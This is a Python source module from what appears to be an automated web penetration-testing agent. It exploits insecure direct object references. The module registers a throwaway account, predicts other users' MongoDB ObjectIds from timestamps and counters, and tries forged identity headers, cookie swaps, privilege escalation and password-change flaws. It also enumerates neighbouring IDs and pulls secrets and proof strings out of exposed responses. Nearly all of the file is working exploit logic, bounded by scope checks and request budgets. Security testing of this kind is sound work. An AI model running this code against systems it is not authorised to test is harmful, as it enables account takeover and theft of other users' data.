from __future__ import annotations

import json
import re
import secrets
from typing import Callable, TypeVar

from ravage.agent_core.agent_state import AgentState
from ravage.deterministic_agents.auth_object_targets import (
    _object_counter_distances,
    _object_ids_from_text,
    _unix_timestamps_from_text,
)
from ravage.probes.specialists.idor_cookie_identity import _probe_cookie_identity_idor
from ravage.probes.specialists.idor_identity_header import (
    _has_identity_header_context,
    _probe_identity_header_idor,
)
from ravage.probes.specialists.idor_password_reset import _probe_password_change_idor
from ravage.probes.specialists.idor_privilege import _probe_privilege_escalation
from ravage.probes.specialists.idor_routes import (
    _prioritize_idor_findings,
    _probe_authenticated_object_routes,
    _probe_idor_followups,
)
from ravage.probes.specialists.idor_signals import _auth_blocked, _idor_access_signal
from ravage.probes.specialists.idor_targets import _idor_candidate_values, _idor_targets
from ravage.probes.specialists.shared import (
    _baseline_value,
    _send_target,
    _target_brief,
    _target_replay,
)
from ravage.web_core.http_probe import ProbeSession, compare_responses, response_secrets
from ravage.web_core.proof_recognizer import recognize_proofs

_ResultT = TypeVar("_ResultT")

_IDOR_REQUEST_BUDGET = 80


def probe_idor_boundary(
    session: ProbeSession,
    state: AgentState,
    result_cls: Callable[..., _ResultT],
) -> _ResultT:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _IDOR_REQUEST_BUDGET
    first_user_findings, first_user_requests, budget = _probe_first_user_objectid_workflow(
        session,
        state,
        budget=budget,
    )
    findings.extend(first_user_findings)
    requests.extend(first_user_requests)
    if _has_proof(first_user_findings):
        return result_cls(
            ok=True,
            probe="idor_boundary",
            summary=(
                "first-user ObjectId IDOR found proof; "
                f"requests={_IDOR_REQUEST_BUDGET - budget}, findings={len(findings)}"
            ),
            findings=_prioritize_idor_findings(findings)[:30],
            requests=requests[:90],
        )
    if _has_identity_header_context(state):
        header_findings, header_requests, budget = _probe_identity_header_idor(
            session, state, budget=budget
        )
        findings.extend(header_findings)
        requests.extend(header_requests)
        if _has_proof(header_findings):
            return result_cls(
                ok=True,
                probe="idor_boundary",
                summary=(
                    "identity-header IDOR found proof; "
                    f"requests={_IDOR_REQUEST_BUDGET - budget}, findings={len(findings)}"
                ),
                findings=_prioritize_idor_findings(findings)[:30],
                requests=requests[:90],
            )
    privilege_findings, privilege_requests, budget = _probe_privilege_escalation(
        session,
        state,
        budget=budget,
    )
    findings.extend(privilege_findings)
    requests.extend(privilege_requests)
    cookie_findings, cookie_requests, budget = _probe_cookie_identity_idor(
        session,
        state,
        budget=budget,
    )
    findings.extend(cookie_findings)
    requests.extend(cookie_requests)
    if _has_proof(cookie_findings):
        return result_cls(
            ok=True,
            probe="idor_boundary",
            summary=(
                "cookie-identity IDOR found proof; "
                f"requests={_IDOR_REQUEST_BUDGET - budget}, findings={len(findings)}"
            ),
            findings=_prioritize_idor_findings(findings)[:30],
            requests=requests[:90],
        )
    password_findings, password_requests, budget = _probe_password_change_idor(
        session,
        state,
        budget=budget,
    )
    findings.extend(password_findings)
    requests.extend(password_requests)
    if _has_proof(password_findings):
        return result_cls(
            ok=True,
            probe="idor_boundary",
            summary=(
                "password-change IDOR found proof; "
                f"requests={_IDOR_REQUEST_BUDGET - budget}, findings={len(findings)}"
            ),
            findings=_prioritize_idor_findings(findings)[:30],
            requests=requests[:90],
        )
    auth_findings, auth_requests, budget = _probe_authenticated_object_routes(
        session,
        state,
        budget=budget,
    )
    findings.extend(auth_findings)
    requests.extend(auth_requests)
    if _has_proof(auth_findings):
        return result_cls(
            ok=True,
            probe="idor_boundary",
            summary=(
                "authenticated object-route crawl found proof; "
                f"requests={_IDOR_REQUEST_BUDGET - budget}, findings={len(findings)}"
            ),
            findings=_prioritize_idor_findings(findings)[:30],
            requests=requests[:90],
        )
    targets = _idor_targets(state)
    auth_blocked_targets: list[dict[str, object]] = []
    for target in targets:
        if budget <= 0:
            break
        target_signals = 0
        baseline_id = str(
            target.get("baseline_id") or _baseline_value(str(target.get("input") or ""))
        )
        baseline = _send_target(session, target, baseline_id)
        budget -= 1
        requests.append(
            baseline.summary(body_chars=180)
            | {
                "target": _target_brief(target),
                "probe_kind": "idor_baseline",
                "baseline_id": baseline_id,
                "id_format": target.get("id_format"),
                "object_type": target.get("object_type"),
            }
        )
        if _auth_blocked(baseline):
            auth_blocked_targets.append(_target_brief(target))
            continue
        for candidate in _idor_candidate_values(baseline_id, str(target.get("id_format") or "")):
            if budget <= 0:
                break
            response = _send_target(session, target, candidate)
            budget -= 1
            delta = compare_responses(baseline, response, marker=candidate)
            requests.append(
                response.summary(body_chars=240)
                | {
                    "target": _target_brief(target),
                    "probe_kind": "idor_candidate",
                    "candidate_id": candidate,
                    "delta": delta.to_json(),
                }
            )
            signal = _idor_access_signal(
                baseline=baseline,
                response=response,
                original_id=baseline_id,
                candidate_id=candidate,
            )
            if not signal:
                continue
            proofs = recognize_proofs(response.body)
            secrets_found = response_secrets(response)
            target_signals += 1
            findings.append(
                {
                    "type": _boundary_finding_type(proofs, secrets_found),
                    "input": _target_brief(target),
                    "object_type": target.get("object_type"),
                    "id_format": target.get("id_format"),
                    "original_id": baseline_id,
                    "candidate_id": candidate,
                    "signal": signal,
                    "proofs": proofs,
                    "matches": secrets_found,
                    "delta": delta.to_json(),
                    "baseline": baseline.summary(body_chars=260),
                    "response": response.summary(body_chars=360),
                    "baseline_replay": _target_replay(target, baseline_id),
                    "replay": _target_replay(target, candidate),
                }
            )
            if proofs:
                break
            followup_findings, followup_requests, budget = _probe_idor_followups(
                session,
                target,
                candidate,
                baseline=baseline,
                response=response,
                budget=budget,
            )
            findings.extend(followup_findings)
            requests.extend(followup_requests)
            if _has_proof(followup_findings):
                break
            if secrets_found or target_signals >= 3:
                break
    if _needs_identity_header_second_pass(state, findings, budget):
        header_findings, header_requests, budget = _probe_identity_header_idor(
            session, state, budget=budget
        )
        findings.extend(header_findings)
        requests.extend(header_requests)
    if _should_emit_auth_guidance(auth_blocked_targets, findings):
        findings.append(
            {
                "type": "idor_requires_authentication",
                "auth_blocked_targets": auth_blocked_targets[:10],
                "next": (
                    "These ID-bearing objects returned 401/403/login-required to the current "
                    "session, so blind ID enumeration cannot reach them. Establish a logged-in "
                    "session first (register/log in, e.g. via the stateful_session probe), then "
                    "re-run IDOR enumeration reusing that session's cookies/headers. For horizontal "
                    "IDOR, create two identities and try to read identity B's object IDs while "
                    "authenticated as identity A."
                ),
            }
        )
    return result_cls(
        ok=bool(findings),
        probe="idor_boundary",
        summary=(
            f"tested {len(targets)} ID-bearing target(s), "
            f"requests={_IDOR_REQUEST_BUDGET - budget}, findings={len(findings)}"
        ),
        findings=_prioritize_idor_findings(findings)[:30],
        requests=requests[:90],
    )


def _boundary_finding_type(proofs: list[str], secrets_found: list[str]) -> str:
    if proofs or secrets_found:
        return "idor_boundary_exposed_secret"
    return "idor_boundary_signal"


def _has_proof(findings: list[dict[str, object]]) -> bool:
    for finding in findings:
        if finding.get("proofs"):
            return True
    return False


def _probe_first_user_objectid_workflow(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    if budget <= 0 or not _state_suggests_first_user_objectid_workflow(state):
        return [], [], budget

    requests: list[dict[str, object]] = []
    findings: list[dict[str, object]] = []
    evidence_text_parts: list[str] = []
    for path in _first_user_info_paths(state):
        if budget <= 0:
            break
        response = session.get(session.absolute(path))
        budget -= 1
        requests.append(response.summary(body_chars=360) | {"probe_kind": "idor_first_user_info", "url": response.url})
        evidence_text_parts.append(response.body)

    if budget <= 0:
        return findings, requests, budget
    registration = _register_first_user_probe_identity(session, state)
    if registration is None:
        return findings, requests, budget
    register_response, register_url, identity = registration
    budget -= 1
    requests.append(
        register_response.summary(body_chars=520)
        | {
            "probe_kind": "idor_first_user_register",
            "url": register_url,
            "username": identity["username"],
        }
    )
    evidence_text = "\n".join([*evidence_text_parts, register_response.body])
    object_ids = _object_ids_from_text(evidence_text)
    distances = _object_counter_distances(evidence_text)
    timestamps = _unix_timestamps_from_text(evidence_text)
    candidates = _first_user_object_id_candidates(object_ids, distances, timestamps)
    if not candidates:
        return findings, requests, budget

    for candidate in candidates[:24]:
        if budget <= 0:
            break
        for path_template in _first_user_profile_templates(state):
            if budget <= 0:
                break
            url = session.absolute(path_template.format(id=candidate))
            if not session.in_scope(url):
                continue
            response = session.get(url)
            budget -= 1
            requests.append(
                response.summary(body_chars=520)
                | {
                    "probe_kind": "idor_first_user_profile_candidate",
                    "url": response.url,
                    "candidate_id": candidate,
                }
            )
            proofs = recognize_proofs(response.body)
            matches = response_secrets(response)
            if not proofs and not matches:
                continue
            findings.append(
                {
                    "type": "idor_first_user_objectid_proof" if proofs else "idor_first_user_objectid_secret",
                    "candidate_id": candidate,
                    "profile_url": response.url,
                    "proofs": proofs,
                    "matches": matches,
                    "response": response.summary(body_chars=620),
                    "replay": {"method": "GET", "url": response.url},
                    "source": {
                        "object_ids": object_ids[:4],
                        "distances": distances[:4],
                        "timestamps": timestamps[:4],
                    },
                }
            )
            return findings, requests, budget
    return findings, requests, budget


def _state_suggests_first_user_objectid_workflow(state: AgentState) -> bool:
    text = _state_text(state)
    return (
        _contains_any(text, ("first user", "1st user", "target user"))
        and _contains_any(text, ("start timestamp", "starttime", "unix timestamp", "created"))
        and _contains_any(text, ("register", "profile", "login"))
    )


def _state_text(state: AgentState) -> str:
    parts = [json.dumps(state.surface, sort_keys=True), json.dumps(state.signals, sort_keys=True)]
    parts.extend(state.facts[-20:])
    parts.extend(state.hypotheses[-10:])
    return " ".join(parts).lower()


def _first_user_info_paths(state: AgentState) -> list[str]:
    # Seed only generic navigation surfaces. Deployment-specific timestamp
    # endpoints must come from observed target evidence below.
    paths = ["/", "/info", "/register", "/login"]
    for endpoint in state.signals.get("endpoints", []):
        endpoint_text = str(endpoint)
        if _contains_any(endpoint_text.lower(), ("starttime", "info", "register", "login")):
            paths.append(endpoint_text)
    return _dedupe_paths(paths)[:8]


def _register_first_user_probe_identity(
    session: ProbeSession,
    state: AgentState,
) -> tuple[object, str, dict[str, str]] | None:
    identity = {
        "username": f"ravage_{secrets.token_hex(4)}",
        "password": f"Ravage-{secrets.token_hex(6)}!",
    }
    for register_url in _first_user_register_urls(session, state):
        response = session.post_form(
            register_url,
            identity,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json, text/html;q=0.9, */*;q=0.8",
            },
        )
        if response.status in {200, 201, 202, 400} and (
            _object_ids_from_text(response.body) or _object_counter_distances(response.body)
        ):
            return response, register_url, identity
    return None


def _first_user_register_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls = [session.absolute("/register"), session.absolute("/signup"), session.absolute("/sign-up")]
    for value in state.signals.get("forms", []):
        match = re.search(r'''"action"\s*:\s*"([^"]*register[^"]*)"''', str(value), flags=re.IGNORECASE)
        if match:
            urls.append(session.absolute(match.group(1)))
    for endpoint in state.signals.get("endpoints", []):
        endpoint_text = str(endpoint)
        if "register" in endpoint_text.lower():
            urls.append(session.absolute(endpoint_text))
    return [url for url in _dedupe_paths(urls) if session.in_scope(url)][:6]


def _first_user_profile_templates(state: AgentState) -> list[str]:
    templates = ["/profile/{id}", "/profiles/{id}", "/user/{id}", "/users/{id}", "/account/{id}", "/accounts/{id}"]
    for endpoint in state.signals.get("endpoints", []):
        endpoint_text = str(endpoint)
        if re.search(r"/(?:profile|profiles|user|users|account|accounts)(?:/|$)", endpoint_text, flags=re.IGNORECASE):
            clean = endpoint_text.rstrip("/")
            if re.search(r"/[a-f0-9]{24}$", clean, flags=re.IGNORECASE):
                templates.append(re.sub(r"/[a-f0-9]{24}$", "/{id}", clean, flags=re.IGNORECASE))
            elif re.search(r"/\d{1,12}$", clean):
                templates.append(re.sub(r"/\d{1,12}$", "/{id}", clean))
            elif "{id}" not in clean:
                templates.append(clean + "/{id}")
    return _dedupe_paths(templates)[:10]


def _first_user_object_id_candidates(
    object_ids: list[str],
    distances: list[int],
    timestamps: list[int],
) -> list[str]:
    candidates: list[str] = []
    timestamp_prefixes = [f"{timestamp:08x}" for timestamp in timestamps if 0 <= timestamp <= 0xFFFFFFFF]
    for object_id in object_ids[:6]:
        if not re.fullmatch(r"[a-f0-9]{24}", object_id):
            continue
        middle = object_id[8:18]
        current_counter = int(object_id[-6:], 16)
        prefixes = _dedupe_paths([*timestamp_prefixes, object_id[:8]])[:4]
        counter_candidates: list[int] = []
        for distance in distances[:8]:
            counter_candidates.extend([current_counter - distance, current_counter + distance])
        for offset in range(1, 12):
            counter_candidates.append(current_counter - offset)
        for counter in dict.fromkeys(counter_candidates):
            if not 0 <= counter <= 0xFFFFFF:
                continue
            for prefix in prefixes:
                candidates.append(f"{prefix}{middle}{counter:06x}")
    return _dedupe_paths(candidates)[:64]


def _contains_any(text: str, markers: tuple[str, ...]) -> bool:
    return any(marker in text for marker in markers)


def _dedupe_paths(values: list[str]) -> list[str]:
    deduped: list[str] = []
    seen: set[str] = set()
    for value in values:
        if not value or value in seen:
            continue
        seen.add(value)
        deduped.append(value)
    return deduped


def _has_finding_type_prefix(findings: list[dict[str, object]], prefixes: tuple[str, ...]) -> bool:
    for finding in findings:
        finding_type = str(finding.get("type") or "")
        for prefix in prefixes:
            if finding_type.startswith(prefix):
                return True
    return False


def _needs_identity_header_second_pass(
    state: AgentState,
    findings: list[dict[str, object]],
    budget: int,
) -> bool:
    if budget <= 0:
        return False
    if _has_finding_type_prefix(findings, ("idor_identity_header",)):
        return False
    if _has_proof(findings):
        return False
    if _has_identity_header_context(state):
        return True
    return not _has_finding_type_prefix(findings, ("idor_boundary",))


def _should_emit_auth_guidance(
    auth_blocked_targets: list[dict[str, object]],
    findings: list[dict[str, object]],
) -> bool:
    if not auth_blocked_targets:
        return False
    return not _has_finding_type_prefix(findings, ("idor_boundary", "idor_identity_header"))
